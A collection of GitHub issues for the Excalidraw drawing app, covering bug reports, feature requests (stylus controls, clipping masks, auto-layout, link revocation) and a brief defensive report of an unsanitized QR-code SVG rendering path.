title: math: isLineSegment does not validate second point
body:
Bug: isLineSegment does not validate second point

File: [packages/math/src/segment.ts](https://github.com/excalidraw/excalidraw/blob/master/packages/math/src/segment.ts)

While going through the isLineSegment implementation, I noticed that it checks segment[0] twice instead of validating both elements of the segment:
```

isPoint(segment[0]) &&
isPoint(segment[0]);
```

Because of this, cases like the following incorrectly pass validation:

`isLineSegment([[0, 0], "invalid"])` // returns true

Ideally, both elements of the segment should be checked:

```
isPoint(segment[0]) &&
isPoint(segment[1]);
```

This can lead to invalid segments being treated as valid, which might cause issues later when segment[1] is used assuming it’s a proper point.
author: Kundan-CR7

title: Excalidraw Pen Tablet User Suggestions
body:
List of suggestions for Obsidian Excalidraw plugin with pen tablet:

1. Pen crosshair always visible when drawing. I don't like how it disappears when drawing a line.
2. Dotting i's and colons and periods are inconsistent. Simply clicking my mouse or tapping a dot on my pen tablet won't actually create a round dot but instead it rarely creates a thin barely visible slit.
3. Custom pen settings sometimes don't save and reset to previous settings directly after editing them.
4. Add a feature to disable all sorts of pen smoothing. I notice it still remains even after setting the custom pen smoothing to 0.
5. This pen smoothing might be the cause for the issue that there is a slight pen lag that occurs even when using the eraser tool. Other application using pens have no delay. This effects my handwriting quite significantly. I suggest having a pen which has no complex custom settings other than color, opacity, and stroke size.
6. Optional setting in file view where folder names are not cut off but instead include the full name word wrapping downward.
7. Pen mode sometimes keeps toggling on automatically. I do not want pressure sensitivity however it sometimes activates on its own on the right side tool bar.
8. Pressure sensitivity that affects stroke size should naturally come with pressure sensitive opacity. This is consistent with real life handwriting pen and pencil. Krita is an example of an application that mimics realistic handwriting and brushes with these features.
9. Eraser setting which partially erases lines instead of the entire thing.
10. Custom pen shortcuts. Quick switch between colors, highlighter, and default.
11. Custom UI scaling. 1440p monitor makes icons extremely small.
12. Highlighter pen sometimes tapers ends, sometimes it doesn't.Nitpicking:
12. Snap to grid default set to off. Free drag is more suited for pen elements.
13. Quick brush settings panel (bottom left) should have default stroke colors be customizable. Sometimes custom pen stroke color reverts back to default instead of using the custom.

title: Support HTML hyperlink creation in Excalidraw elements
body:
## Feature Request

Allow users to create HTML hyperlinks within Excalidraw. The hyperlink should work as in markdown-style `[label](hyperlink)`, providing clickable links inside the drawing. This improves interactivity in diagrams and lets users attach references or documentation directly to shapes or text.

### Desired Behavior
- Support text input in the format `[label](hyperlink)`.
- Render recognized links as clickable hyperlinks in the canvas.
- Open links in a new browser tab when clicked.
- Links should be clearly styled to indicate interactivity (e.g., underline, color).

### Motivation
- Makes diagrams actionable for knowledge sharing and in presentations.
- Enables referencing external docs, tickets, design URLs, etc. directly from the diagram.

### Additional Context
- Behavior should be consistent with markdown links elsewhere (e.g., GitHub issues).
- Safeguards should prevent broken or malicious links.

_No assignees or project specified._
author: asilverman

title: Bug:   rectangleIntersectRectangle  incorrectly returns false for adjacent rectangles
body:
The **rectangleIntersectRectangle** function inside the @excalidraw/math package incorrectly evaluates touching rectangles as non-intersecting. The comparison logic uses strict inequalities (< and >), which means rectangles that share an exact edge or corner evaluate to false.

For instance, two rectangles resting perfectly side-by-side or corner-to-corner fail the intersection check when they should technically be considered overlapping/intersecting in standard bounding-box logic.

**Expected Behavior:** The boundary checks should use inclusive inequalities (<= and >=) so that touching elements are correctly identified as intersecting.

author: Y-R-T

title: Feature Request: Linked Instances / "Sync" for Reusable Groups
body:
While exploring the project, I noticed that the current library system creates independent copies of elements. If a user places the same custom group (like a UI component) multiple times on a canvas, there is no way to update all of them at once.

**The Proposal:**
It would be a great addition to have a "sync" or "link" feature for groups. If several elements are instances of the same original group, changing the properties (stroke, color, or opacity) on the original should optionally update all the copies on the board.

**Why this is useful:**
Currently, editing recurring elements requires a lot of manual work. Adding a way to maintain a relationship between these copies would bring Excalidraw closer to the workflow of professional design tools like Figma or Miro, where "Master" components are standard.

**Technical Impact:**
This would likely require an update to the element data structure to allow an element to reference a "Parent ID" or a "Definition" instead of just holding its own static properties.
author: feridsassi

title: Feature request: Smart Auto-Layout for connected elements
body:
I was testing out Excalidraw for some flowcharts, and it's great for quick sketching, but it gets messy really fast. If you move one box, you have to manually drag every other box and arrow to make it look lined up again. It takes way too much time to keep things neat.

**The Idea:**

It would be cool to have a "Tidy Up" or "Auto-layout" button. You select a bunch of messy shapes, click the button, and they all snap into a clean grid or a straight line with equal spacing.

**Why it helps:**

Other tools like Miro or Figma have this, and it saves so much "busy work." It lets you focus on the actual diagram instead of spending 5 minutes trying to align arrows perfectly.

**Technical part:**

Basically, the app would need a simple algorithm to calculate the $(x, y)$ coordinates of the selected items and space them out evenly based on their connections.

title: Feature Request : Add Numeric Shortcut for Stroke Style Toggle (Key 9)
body:
Message to Dev

hey excalidraw dev, thanks for building this wonderful workflow in obisidian.
It Really unlocked my thinking and creativity in constraints, tranformed my life. 

Hope you could add this feature- it will remove a small or can become a big friction in long sessions. 

// Below is my idea of execution, feel free to switch the shortcut or improve upon it, for you have the long term vission of this project. Thanks for reading this

---

### 📝 Feature Request: Add Numeric Shortcut for Stroke Style Toggle (Key `9`)

**Summary**  
Excalidraw currently supports numeric shortcuts (1–8, 0) for tool selection in the floating toolbar. Stroke type (solid, dashed, dotted) can only be changed via the GUI or Command Palette. I propose adding a new numeric shortcut (`9`) to quickly toggle stroke styles, improving speed and workflow for users who frequently switch between line types.

**Proposed Behavior**  
- **Default stroke style:** Solid.  
- **Pressing `9` repeatedly:** Cycles through stroke styles in order → Solid → Dashed → Dotted → back to Solid.  
- **Holding `9` + typing another number:** Directly selects a specific stroke style:  
  - `9 + 1` → Solid  
  - `9 + 2` → Dashed  
  - `9 + 3` → Dotted  
- **Floating bar adaptation:** When stroke style changes, the floating bar should animate/highlight the stroke style icon to visually confirm the change.

**Benefits**  
- Keeps existing numeric mappings intact (no disruption for current users).  
- Provides a fast, keyboard‑friendly way to change stroke styles without opening menus.  
- Enhances productivity for diagramming, sketching, and wireframing workflows.  
- Consistent with Excalidraw’s philosophy of lightweight, intuitive shortcuts.

**Optional Enhancements**  
- Allow customization of stroke style shortcut mappings in settings.  
- Add subtle animation (e.g., icon highlight or fade) in the floating bar when stroke style changes, reinforcing user feedback.

---

✅ This proposal is backward‑compatible, lightweight, and adds significant usability for power users.

author: peltsippi

title: Development docs: add guidance for users who cannot install Yarn globally
body:
The local installation instructions in the development documentation assume Yarn is available globally in the user's terminal. In some environments — such as systems with restricted permissions or certain OS configurations — installing Yarn globally is not possible or requires extra steps that are not covered in the docs.

Following the instructions as written results in a `command not found: yarn` error, with no indication of how to proceed. The workaround is not immediately obvious to someone unfamiliar with how npm resolves local binaries.

It would be helpful to add a note in the documentation explaining what to do in this situation, so contributors can get the project running without having to figure it out on their own.

title: [Feature Request] Animated "Flow" Arrows for Data & Logic Visualization
body:
## Key Use Cases
- System Architecture: Showing real-time data flow between microservices.
- User Flows: Highlighting the "happy path" in a UI wireframe.
- Instructional Design: Demonstrating step-by-step processes in live tutorials.

## Technical Implementation
- SVG Animation: Use stroke-dasharray and animate stroke-dashoffset. This is the most performant, native browser method.
- Logic: Normalize animation speed relative to path length to ensure consistent visual flow across different arrow sizes.
- Accessibility: Honor prefers-reduced-motion settings to auto-disable for sensitive users.

## UI Integration
- Toggle: A simple "Animate" checkbox in the arrow property panel.
- Controls: A slider for Speed and a button to Reverse Direction.

title: Feature request: Add Cloud as a supported shape element
body:
### Summary
Add cloud as a first-class Excalidraw shape, similar to rectangle, diamond, and ellipse.

### Motivation
Excalidraw currently offers foundational shapes like rectangles, ellipses, and diamonds. However, when building architecture diagrams, flowcharts, or brainstorming mindmaps, users frequently need a **Cloud** shape to represent concepts like cloud computing, SaaS integrations, or distinct thought bubbles visually.

### Proposal
Add a "Cloud" shape as a first-class citizen element to the Excalidraw editor stack.
The cloud element should support all standard shape capabilities identically to existing dynamic shapes:
- Native rendering with `roughjs` stroke and fill integration.
- Full interaction tracking (selection, resizing, moving, and bounding box geometry generation).
- Bound text support with inscribed text-box center alignment layout.
- Arrow binding (lines and arrows snapping gracefully to its curved borders/edges).
- Seamless creation via the main toolbar and mobile interface layouts.

### Additional Note
I have already completed the implementation for this and will be opening a Pull Request shortly.

title: Hex color input does not show validation error for invalid values like #GGGGGG or partial hex strings
body:
## Bug Report

### Describe the bug
When a user types an invalid hex color value (e.g. `#GGGGGG`, `#ZZZ`, or an incomplete string like `#FF`) into the color picker input field, no validation error or visual feedback is shown. The input silently fails or falls back to a default color without informing the user.

### Steps to reproduce
1. Open Excalidraw
2. Select any shape
3. Click on the fill/stroke color picker
4. Manually type an invalid hex value like `#GGGGGG` or `#XYZ123` in the hex input field
5. Press Enter or click outside

### Expected behavior
The input should display a clear validation error (e.g. red border, error tooltip, or inline message) indicating the entered hex value is invalid, so the user knows to correct it.

### Actual behavior
No error is shown. The invalid value either silently reverts or causes unexpected behavior without any user feedback.

### Environment
- Browser: Chrome 124
- OS: Windows 11
- Excalidraw version: latest (excalidraw.com)

### Additional context
This is a UX improvement that would significantly help users who manually type hex values. A simple regex validation (`/^#([0-9A-Fa-f]{3}|[0-9A-Fa-f]{6})$/`) on the input blur/submit event would fix this.

author: eliandoran

title: Default theme should follow system preference instead of light theme
body:
Currently, Excalidraw defaults to the light theme when the app is opened for the first time. While users can manually switch to dark mode or system-based theme afterward, the initial experience always starts in light mode.

This can lead to a suboptimal user experience—especially for users who have their system set to dark mode. On larger screens in particular, the bright white canvas briefly flashes before the theme is adjusted, which can feel jarring and inconsistent with user preferences.

---

**Expected behavior:**
The app should default to the system theme (`prefers-color-scheme`) on first load, instead of hardcoding the light theme. This ensures that users with dark mode enabled at the OS/browser level immediately see the appropriate theme without any visual flash or manual adjustment.

---

**Current behavior:**

* Default theme: Light
* User must manually switch to Dark or System
* Causes a brief flash of bright UI for dark mode users on first load

---

**Proposed solution:**
Set the default theme to "system" so that Excalidraw respects the user's OS/browser theme preference from the initial render.

---

**Why this matters:**

* Improves first-load user experience
* Prevents sudden bright flashes for dark mode users
* Aligns with modern UX practices followed by many apps
* Reduces friction for developers and users who consistently use dark mode

---

**Contribution:**
I would like to work on implementing this change if it aligns with the maintainers’ direction.
author: AparAgarwal

title: Request: expose text measurement, binding utilities, and a standalone mermaid converter from @excalidraw/excalidraw
body:
We're building an AI-assisted diagram skill that generates `.excalidraw` files programmatically. The generator runs in Python and produces JSON directly, so it can't benefit from the full Excalidraw runtime. But a Node.js helper in the pipeline could.

Three things we keep hitting walls on:

### Text measurement

We approximate box dimensions using hardcoded font-width multipliers. It works most of the time, but text overflows and boxes shrink when the approximation is off. The real `measureText` function in `packages/element/src/textMeasurements.ts` uses canvas and gets this right. It's already exported from `@excalidraw/element`, but not from `@excalidraw/excalidraw`. Most external consumers are going to install the main package, not dig into the internals.

### Arrow binding

AI generators tend to set `startBinding: null` and `endBinding: null` on all arrows. The schema for correct bindings is clear from reading the source, but the computation helpers — `calculateFixedPointForElbowArrowBinding` and `calculateFixedPointForNonElbowArrowBinding` — aren't accessible from the public API. Properly bound arrows are visually correct and survive element moves; unbound arrows are brittle.

### Mermaid conversion

The `parseMermaidToExcalidraw` logic in `TTDDialog/common.ts` is tightly coupled to React refs and canvas preview. A standalone `parseMermaidToExcalidraw(definition, lib)` that returns `{elements, files}` without the React wiring would be broadly useful. AI tools produce Mermaid well; having a clean path from Mermaid to Excalidraw elements programmatically would open up a lot of tooling use cases.

Most of this already exists in `@excalidraw/element` — for the text and binding utilities it's largely a matter of re-exporting from the main package entry point. The mermaid case needs a bit of extraction but the logic is there.

We're happy to send PRs for any of these once we know whether expanding the public API surface is something the team is open to. Not trying to turn `@excalidraw/excalidraw` into a diagram-generation SDK — just trying to reach three things that are already implemented but not quite accessible.

title: Ability to revoke/invalidate live collaboration links
body:
Description:
Is your feature request related to a problem? Please describe.
Currently, once a live collaboration link is generated and shared, there is no native way to invalidate that specific URL. If a user accidentally shares a link to a canvas containing confidential information, business strategies, or personal roadmaps, they cannot revoke access. The only workaround is manually deleting the canvas contents, which is not intuitive during a panic scenario.

Describe the solution you'd like
It would be incredibly helpful to have a "Revoke Access" or "End Session" button within the Live Collaboration menu. Clicking this would invalidate the current URL/session ID, forcing anyone with the old link to lose access, and allowing the host to generate a fresh, secure link if needed.

Describe alternatives you've considered
Currently, the only alternative is to copy all elements, paste them into a completely new browser tab to generate a new session, and then delete all elements from the compromised canvas.

Additional context
Adding a simple way to kill a live session would greatly improve security and user trust, especially for professionals using Excalidraw for sensitive architectural or strategic planning.

title: Vector drawings distort when scaled
body: My group's workflow involves using a lot of little icons. Initially we tried creating these using vector drawing tools, which worked quite nicely, until we discovered a limitation: vector drawings distort when you scale them. The following two stick figures are exactly the same, except that one has been scaled to a larger size using the selection tool. The thickness of the lines does not scale with the shapes, and for some reason the head stops being considered a closed shape and the background fill breaks. This means that Excalidraw's vector drawing tools fail at the precise use case for vector graphics: lightweight, scalable representations for simple graphical designs. Because of this limitation we have switched to uploading a bunch of little bitmap images, which often fail to display for some users and have other disadvantages. The first of the two issues (stroke width not scaling with the shape) would be easy to solve with a toggle that makes it do that. The second (filled shape breaking when scaled) could be solved with a toggle that _forces_ a shape to be filled even if Excalidraw doesn't detect it as a closed shape.

author: Red-Unicorn

title: Add a keyboard shortcut to open the arrowhead picker
body:
### Problem

When an arrow is selected, the side panel exposes two arrowhead pickers (start and end). Once a picker popover is open, single-letter shortcuts (e.g. for arrow, triangle, dot, bar, none) let you pick a head without the mouse. But there is no shortcut to *open* the picker in the first place — you have to click it. This makes the existing in-picker shortcuts only partially useful for keyboard-driven workflows.

This is analogous to `s` (stroke color) and `g` (background color), which open their respective color pickers when an element is selected. Those shortcuts were added in #2649; the arrowhead row from that issue's table was never shipped.

### Proposal

Add a keyboard shortcut, available when an arrow is selected, that opens the arrowhead picker. Open questions for maintainers:

1. **Which key?** The unshifted letters in the arrow-tool family are mostly taken (`a` arrow tool, etc.). Possibilities: `q`, `h` (head), or a modifier combo. Happy to follow a maintainer preference.
2. **Start vs. end head.** Two pickers exist. Options:
   - One shortcut that toggles/cycles which picker is open. (this is what I'd suggest)
   - One shortcut opens the *end* picker (most common case); a modifier (e.g. `Shift+`) opens the *start* picker.
   - Two distinct shortcuts.
3. **Discoverability.** Add the shortcut to the `?` help dialog and surface it in the picker's `title`/tooltip, consistent with #4086.

### Related

- #2649 (closed) — umbrella issue for property shortcuts; arrowheads were listed but never implemented.
- #4086 — discoverability of existing shortcuts.
- #9219 — alternative (mouse) approach to changing arrowheads quickly.

### Willing to contribute

I'd like to implement this once the key choice and start/end behavior are agreed.
author: tuzmusic

title: Add crop/selection-based export for images in Excalidraw
body: Problem Currently, when exporting an image in Excalidraw, the exported file includes the entire canvas area or the full bounding area of all visible elements. In many cases, I only want to export a specific section of the drawing without needing to manually move or delete other elements. For example: I create multiple diagrams on the same canvas. I only want to export one diagram. The current export includes unnecessary whitespace or other unrelated content. Expected Behavior There should be an option to: Select a specific area / crop region before exporting. Export only the selected/cropped portion of the canvas. Ignore elements outside that crop region. Possible UX ideas: “Crop before export” toggle in the export modal. Drag-to-select export region. Export selected frame / selected area only. Current Behavior Exporting includes the whole visible scene / bounding area, making it harder to export only the relevant part. Why this would help This would make Excalidraw more convenient for: Sharing focused diagrams/screenshots Documentation Presentations Avoiding extra editing in external tools Additional Context A cropping feature during export would remove the need to use external image editors just to trim the exported image.
author: vaijaaaaa

title: fix(eraser): groupsToErase Set polluted with undefined for ungrouped elements
body:
## Description

In `EraserTrail.updateElementsToBeErased()`, when the eraser intersects an ungrouped element (one with an empty `groupIds` array), the code calls `element.groupIds.at(-1)!` which returns `undefined`.

This `undefined` value is then added to the `groupsToErase` Set and used as a key for `getElementsInGroup(map, undefined)`.

## Steps to reproduce

1. Draw a few standalone rectangles on the canvas (no grouping)
2. Select the eraser tool (press `E`)
3. Drag the eraser across the rectangles
4. In browser console, the `groupsToErase` Set contains `undefined`

## Code location

`packages/excalidraw/eraser/index.ts` lines 120 and 156:

\`\`\`typescript
const shallowestGroupId = element.groupIds.at(-1)!;
\`\`\`

When `groupIds` is `[]`, `.at(-1)` returns `undefined`. The non-null assertion `!` silences TypeScript but does not prevent the runtime issue.

## Impact

- `groupsToErase` Set gets polluted with `undefined`
- `getElementsInGroup(map, undefined)` is called unnecessarily (returns empty array since no element has `undefined` in its groupIds)
- Individual element erasure still works correctly via the later `.add(element.id)` call, so there is no user-visible crash, but the internal state is incorrect

## Proposed fix

Add `element.groupIds.length > 0` guard before accessing `.at(-1)` in both the erase and restore paths. I have a PR ready with the fix and tests.
author: HrushiYadav

title: fix(clipboard): cut action silently loses data when clipboard write fails
body:
## Description

The cut action (`actionCut`) in `actionClipboard.tsx` fires an async copy (`actionCopy.perform`) without awaiting it, then immediately deletes the selected elements via `actionDeleteSelected.perform`.

If the clipboard write fails (permission denied, browser restriction, iframe/embed context, corporate browser policy), the elements are deleted but the clipboard is empty. The user loses their data with no error shown.

## Steps to reproduce

1. Open excalidraw
2. Draw some shapes on the canvas
3. Block clipboard access (browser console):
```js
navigator.clipboard.write = async () => { throw new Error("Clipboard blocked"); };
navigator.clipboard.writeText = async () => { throw new Error("Clipboard blocked"); };
document.execCommand = () => false;
```
4. Select all elements (Ctrl+A)
5. Cut (Ctrl+X)
6. Elements are deleted but clipboard is empty
7. Paste (Ctrl+V) brings back nothing. Data is gone.

## Real world scenarios where this happens

- User denies clipboard permission prompt
- Browser blocks clipboard access without user gesture
- App running inside an iframe with restricted permissions
- Corporate browser policies that block clipboard APIs
- Firefox on non-HTTPS domains

## Code location

`packages/excalidraw/actions/actionClipboard.tsx` lines 117-119:

```typescript
perform: (elements, appState, event, app) => {
    actionCopy.perform(elements, appState, event, app); // async, NOT awaited
    return actionDeleteSelected.perform(elements, appState, null, app);
},
```

`actionCopy.perform` is async (line 28) but the result is not awaited. The delete runs immediately regardless of whether the copy succeeded.

## Proposed fix

Make `perform` async, await the copy result, and only delete if copy succeeded. If copy fails, surface the error to the user and keep elements intact. I have a PR ready with the fix.

title: Inconsistent aspect ratio lock behavior when resizing shapes and cropping images
body:
When resizing a square shape, the bounding box defaults to a rectangular (free) resize. To maintain the aspect ratio, you have to hold Shift.

However, when cropping an image, the behavior is the opposite — cropping is constrained by default, and you need to hold Shift to crop freely.

It would be great if both interactions followed the same convention. Ideally, free resize/crop should be the default in both cases, with Shift used to constrain the aspect ratio — or vice versa, as long as it's consistent.

title: Shift dragging line handlers jumps after mouse up in proximity to other objects
body:
Usually, when you drag points from a line while holding SHIFT, you can draw straight lines (or whatever snap points the application sets), e.g. 30 degrees, 45 degrees, etc.

This usually works well in excalidraw. However, if you try to create lines close to another object, e.g. a rectangle, the handle point you're currently dragging with SHIFT, jumps to where it would be as if you never pressed SHIFT. This is probably because excalidraw thinks I find linking the currently line to the other object (e.g. rectangle) more important.

imho snapping to other objects should be of less priority than the SHIFT modifier.

title: FR: Add options to disable pressure sensitivity, tilt sensitivity, and improve palm rejection for Apple Pencil / stylus users
body:
Problem
Yes.

I use Excalidraw on iPad with Apple Pencil (both in the web app and the Obsidian Excalidraw plugin). Compared to native note-taking apps like Goodnotes or Apple Notes, handwriting in Excalidraw feels much harder to control because:

- pressure sensitivity changes line width unintentionally
- tilt sensitivity can alter strokes unexpectedly
- palm touches are sometimes interpreted as drawing input
- handwriting becomes inconsistent and sloppy

Currently, there is no straightforward way to fully disable these stylus behaviors.

Solution
Please add explicit stylus input controls, such as:
- Toggle: Disable pressure sensitivity
- Toggle: Disable tilt sensitivity
- Toggle: Pencil-only drawing mode
- Improved palm rejection mode
- Fixed-width pen mode for handwriting
- Optional "handwriting mode" optimized for note-taking instead of

Ideally these settings would work for:
- Apple Pencil
- Samsung S-Pen
- Microsoft Surface Pen 
- other stylus devices


Real-Life
- Students taking handwritten lecture notes
- Users writing long-form notes in Obsidian
- iPad users using Excalidraw as a digital notebook
- People who prefer consistent line width while handwriting
- Users resting their palm on the screen while 

These controls would make Excalidraw much more usable as a handwriting tool, not only as a diagramming tool.
in addition, I believe it is very important for people to be able to take handwritten notes and store these in their long-term knowledge databse, because they simply feel much more real and have a stronger effect.

Alternatives
There is no real workaround for this problem.

There are alternative solutions like downloading PDFs from notetaking apps and connecting these but that is simply not the same like having excalidraw stored directly in your Obsidian vault. It is also harder to make changes.
author: FoxyGamer16

title: FR: Improve Apple Pencil / stylus drawing latency and stroke smoothness on iPad and tablets
body:
Problem
Yes.

When drawing or handwriting in Excalidraw on iPad, strokes feel delayed and visually choppy compared to native note-taking apps like Goodnotes or Apple Notes.

The latency and rendering smoothness make handwriting feel less natural and reduce writing quality.

This is especially noticeable during:
- fast handwriting
- long note-taking sessions
- quick sketching
- continuous pen movement

Solution
Please improve stylus rendering performance and stroke responsiveness, especially on tablets.

Potential improvements could include:
- lower input latency
- smoother real-time stroke rendering
- better Apple Pencil prediction handling
- higher-frequency stroke updates
- optimized rendering pipeline for handwriting
- optional low-latency mode for note-taking

Real-life usage scenarios
- Taking handwritten notes during lectures or meetings
- Brainstorming on infinite canvases
- Fast sketching and ideation
- Daily use of Excalidraw on iPad tablets

Improving stroke smoothness would make Excalidraw much more competitive as a handwriting and note-taking platform.

Alternatives
Currently, I use Goodnotes for handwriting instead.
However, this workaround is horrible and does not work effectively.

title: Export workflow navigation for UX
body:
### Description

While testing Excalidraw, I noticed that the export workflow requires extra navigation for what feels like a primary user action.

After finishing a drawing, I expected exporting/downloading the work to be immediately accessible. Instead, the export option is inside the same panel as styling and other settings, which makes the export workflow feel less direct than expected.

### Why This Matters

Exporting is typically one of the final and most important actions in a drawing application. Because of that, users may expect export/download actions to be more visually distinct or immediately accessible without opening an additional settings-style panel.

While the export feature is available and functional, grouping it together with styling and editing controls may create unnecessary friction for users trying to quickly save or export their finished work.

### Steps

1. Open Excalidraw
2. Drawing
3. Attempt to export the drawing
4. Notice that exporting requires reopening a panel

### Suggested Improvement

Consider making export actions more visually distinct or more directly accessible as part of the primary workflow.

### Environment

- Browser: Chrome
- Device: Desktop

title: Refactor cleanAppStateForExport to clearAppStateForExport for naming consistency
body:
While reading through packages/excalidraw/appState.ts I noticed a small naming issue with three related export functions in the same file:

- Line 283: `export const clearAppStateForLocalStorage`
- Line 287: `export const cleanAppStateForExport`
- Line 291: `export const clearAppStateForDatabase`

All three are simple wrappers around the same internal helper `_clearAppStateForStorage`. The only thing that's different between them is the storage type they pass in ("browser", "export", or "server"). Two of them use the word "clear" but the middle one uses "clean", even though they all do the same thing.

Someone reading the code might think "clean" means something different from "clear" when it doesn't. The fix would be to rename `cleanAppStateForExport` to `clearAppStateForExport` so all three names match. If anyone outside the project imports the old name, it could be kept as a deprecated alias so nothing breaks.

Relevant file: https://github.com/excalidraw/excalidraw/blob/master/packages/excalidraw/appState.ts#L283-L293
author: BaileyBounnam

title: Bug: zh-CN locale coverage can be verified automatically in CI
body:
## Describe the issue

Currently, locale files like `zh-CN.json` can drift from `en.json` without automated detection. A CI check comparing JSON key counts between locale files would catch missing translations early.

## Suggested improvement

Add a CI step that:
1. Compares key sets between `en.json` and each locale file
2. Reports any missing keys
3. Fails the build (or at least warns) when translations are incomplete

This would prevent the kind of regression where a new `progressDialog` key is added to English but missed in other locales.

title: Feature suggestion: Use shape as a clipping mask
body: > [!NOTE] > This is similar to but not the same as https://github.com/excalidraw/excalidraw/issues/4566 which relates to clipping masks specifically for images. This is a feature suggestion to add the ability to use any (fillable) shape as a clipping mask similar to the way masks work in Figma/Illustrator. 1. A shape is designated as a "mask" in the UI 2. Shapes, images, text, and other objects placed _inside_ of the mask are clipped visually by the mask's edges 3. The mask and clipped objects are effectively grouped, and can be moved and scaled as a single object (like a regular group) The exact UX for designating a shape as a "mask" is TBC. 1. In both Figma and Illustrator, a user first selects the object that will be used as a mask, as well as the objects to be masked. 2. Then, the user can use either a UI button or right click the selection to create the mask. In Figma, the bottom-most shape is used as the mask. In Illustrator, it's the top-most shape. I prefer Illustrator's top-most approach as it's most intuitive (the mask is being applied over the top of the objects it is masking, from the perspective of the viewer). The image below helps to illustrate how the mask would work in practice. The larger square is the top-most shape, and is used to clip the visible content of the smaller overlapping shape within its boundaries. > [!NOTE] > Most clipping mask implementations hide the mask object itself once it has been turned into a mask. This is the most versatile approach, as users can simply duplicate and centre-align the original object if they intend for the mask object to appear in the final displayed object -- or not. Reference docs: https://help.figma.com/hc/en-us/articles/360040450253-Masks https://helpx.adobe.com/au/illustrator/desktop/manage-objects/edit-objects/create-clipping-masks.html ## Motivation Clipping masks have myriad uses and are not specific to any particular design. However, in my case, I often use Excalidraw to create UI mockups which typically include a device viewport as a bounding box. Currently, there is no way to "clip" the on-screen contents within my mockup to the boundary of the viewport. This would be possible if the device viewport shape could be used as a clipping mask.
author: isAdrisal

title: Make Left Properties Panel Draggable
body:
### Problem
The properties sidebar (Stroke, Background, Opacity, Layers, Align, etc.) is currently fixed to the left side of the screen.

During drawing sessions — especially on smaller screens, tablets, or while working on zoomed-in/large canvases — the fixed panel can obstruct parts of the workspace and reduce overall flexibility. This becomes more noticeable during freehand drawing or when positioning elements near the left side of the canvas.

### Proposed Solution
Allow the properties/sidebar panel to be draggable and repositionable by the user.

Possible behaviors could include:
- Drag the panel anywhere on the screen
- Optional docking support:
  - Left
  - Right
  - Floating mode
- Remember panel position during the session (or optionally across sessions)

### Benefits
- Better workspace customization
- Improved usability on smaller displays and tablets
- More comfortable workflow for stylus/pencil users
- Less obstruction while drawing or editing
- Greater flexibility for different working styles
- UX consistency with many professional creative/design tools

### Additional Context
The current fixed placement can interrupt workflow when drawing near the left edge or when using larger floating objects on the canvas.

A draggable properties panel would provide a more flexible and ergonomic editing experience without affecting existing functionality for users who prefer the current layout.

title: Feature Request: One-Step Arrow Attachment with Inner Control Point
body: ## Feature Request: One-Step Arrow Attachment with Inner Control Point ### What issue does this solve? When making arrows between containers, I want the control point to be in the center of both. ### Problem Attaching an arrow to a container such that its control point sits inside the container requires two steps: 1. Stick the arrow to the container edge. 2. Manually position the inner control point. ![Arrow stuck to container edge](https://github.com/user-attachments/assets/95c73a16-874d-4e69-aac1-1afe8b6cf65b) ![Direction selector inside container](https://github.com/user-attachments/assets/f1beaee9-560e-43a3-a211-bc978be84ea6) ### Desired Behavior Holding a modifier key (`Command` on macOS, `Control` otherwise) while placing an arrow onto a container should: - Snap the arrow to the nearest edge. - Place the inner control point at the cursor's current position inside the container. This collapses the two-step process into one action. ![One-step placement concept](https://github.com/user-attachments/assets/f349ce05-bce7-47b6-9f25-16076a187fcb) ### Expected Behavior | Step | Current | Proposed | |------|---------|----------| | Place arrow on edge | Arrow sticks to edge | Arrow sticks to edge | | Set inner control point | Manual drag of control point | Mouse position sets control point automatically when modifier key is held | ### Use Case Speeding up diagram workflows where arrows frequently point into containers from specific edges. ### Additional Considerations - Corner cases: when the edge is ambiguous, fall back to manual control point placement or default to the longer adjacent side. - Should the modifier also apply when dragging existing arrows between containers?
author: Today20092

title: Bug: New Folder input field persists previous folder name
body:
### Description
I noticed a UI/UX bug in the Excalidraw desktop app (macOS) where the "New Folder" dialog does not clear its state after a folder is created. 

### Steps to Reproduce
1. Open the Excalidraw desktop application.
2. Click on the **New Folder** button.
3. Type a name (e.g., `Try1`) and confirm.
4. Click the **New Folder** button again.

### Expected Behavior
The input field should be empty, or at least show a default placeholder like "Untitled Folder," allowing for a fresh entry.

### Actual Behavior
The input field is prefilled with the string from the last created folder (e.g., `Try1`). This requires the user to manually backspace or select all text to delete it before typing a new name.

### Impact
While minor, it creates a repetitive friction point for users organizing their workspace with multiple folders. It deviates from standard UI patterns where input modals should reset upon successful submission.

### Environment
- **Platform:** macOS
- **App Version:** Version 1.7.3 (59)
- **Installation:** Desktop Download (not web version)

### Media
I have attached a screen recording demonstrating this behavior below.

https://github.com/user-attachments/assets/bc709c91-40f0-46e2-b068-96bc00c8662a

---
**Note for Maintainers:** I am interested in contributing to Excalidraw. If this is a confirmed bug and the fix is straightforward, I would be happy to submit a PR to help resolve this.
author: Shaanworkspace

title: feat: explore in-canvas DOM rendering using HTML-in-Canvas API
body:
Chromium has introduced the experimental [HTML-in-Canvas API](https://chromestatus.com/feature/5172548013916160) behind a flag in origin trials. This feature allows the browser engine to natively paint DOM elements directly into a canvas context while fully preserving native input field focusing, text selection, browser translation, and accessibility tree syncing.

This could potentially improve performance and unlock new capabilities for Excalidraw's engine — implemented as a progressive enhancement with graceful fallback to current behavior on unsupported browsers:

- Eliminate absolute-positioned HTML overlay hacks for active text inputs/areas.
- Enable users to paste and natively render rich HTML layout content directly onto the infinite canvas surface.
- Correctly apply layer effects, clips, and transforms across raw canvas elements and rich text/DOM elements seamlessly.

Other major canvas-driven web frameworks are already exploring this capability (see Flutter's tracking issue: flutter/flutter#186825). 

Opening this thread to track the API's progress and discuss potential architecture spikes for when the specification matures into a cross-browser standard.

author: ssomevi-sys

title: Security: XSS Vulnerability via QR Code SVG Rendering
body:
## Summary

A cross-site scripting (XSS) vulnerability exists in the QR code rendering component. The SVG data is rendered using `dangerouslySetInnerHTML` without sanitization, which could allow an attacker to inject malicious scripts.

## Location

File: `excalidraw-app/share/QRCode.tsx:53`

## Vulnerability Details

The QRCode component renders SVG data directly:

```tsx
<div
  className="ShareDialog__active__qrcode"
  dangerouslySetInnerHTML={{ __html: svgData }}
/>
```

The `svgData` comes from `generateQRCodeSVG(value)` which is dynamically imported from `./qrcode.chunk`. While the QR code library is expected to be safe, there is no validation or sanitization of the SVG output.

If an attacker can:
1. Manipulate the collaboration URL that generates the QR code, OR
2. Exploit a vulnerability in the QR code library

Then they could inject malicious SVG containing:
- `onload` or `onerror` attributes with JavaScript
- Embedded `<script>` tags
- SVG animation elements with JavaScript handlers

## Impact

- **XSS Attack**: Execution of arbitrary JavaScript in the victim's browser context
